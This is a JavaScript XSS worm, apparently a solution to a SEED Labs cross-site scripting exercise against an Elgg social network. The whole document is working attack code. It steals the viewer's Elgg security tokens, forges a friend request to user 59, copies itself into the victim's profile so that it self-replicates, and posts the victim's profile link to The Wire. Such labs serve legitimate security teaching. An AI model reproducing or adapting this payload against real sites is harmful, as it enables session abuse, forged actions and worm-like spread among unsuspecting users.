<script id=worm>
        window.onload = function () {
            {
                var Ajax=null;
                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
                var token="&__elgg_token="+elgg.security.token.__elgg_token;
                //Construct the HTTP request to add Samy as a friend.

                var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+ts+token+token;

                    //Create and send Ajax request to add friend
                if (elgg.session.user.guid != 59) {
                        //console.log("sending from "+elgg.session.user.guid);
                        Ajax=new XMLHttpRequest();
                        Ajax.open("GET",sendurl,true);
                        Ajax.setRequestHeader("Host","www.seed-server.com");
                        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                        Ajax.send();
                }
            }
            {
                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
                var token="__elgg_token="+elgg.security.token.__elgg_token;
                //Construct the content of your url.
                var sendurl= "http://www.seed-server.com/action/profile/edit";
                var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
                var jsCode = document.getElementById("worm").innerHTML;
                var tailTag = "</" + "script>";
                var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
                var content=token+ts+
                        "&description="+wormCode+
                        "&guid="+elgg.session.user.guid;
                if(elgg.session.user.guid != 59)
                {
                        //Create and send Ajax request to modify profile
                        var Ajax=null;
                        Ajax=new XMLHttpRequest();
                        Ajax.open("POST",sendurl,true);
                        Ajax.setRequestHeader("Host","www.seed-server.com");
                        Ajax.setRequestHeader("Content-Type",
                        "application/x-www-form-urlencoded");
                        Ajax.send(content);
                }
            }
            {
                //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
                //and Security Token __elgg_token
                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
                var token="__elgg_token="+elgg.security.token.__elgg_token;
                //Construct the content of your url.
                var sendurl= "http://www.seed-server.com/action/thewire/add";
                var content=token+ts+
                        "&body="+encodeURIComponent(elgg.session.user.url);
                if(elgg.session.user.guid != 59)
                {
                        //Create and send Ajax request to modify profile
                        var Ajax=null;
                        Ajax=new XMLHttpRequest();
                        Ajax.open("POST",sendurl,true);
                        Ajax.setRequestHeader("Host","www.seed-server.com");
                        Ajax.setRequestHeader("Content-Type",
                        "application/x-www-form-urlencoded");
                        Ajax.send(content);
                }
            }
        }
</script>
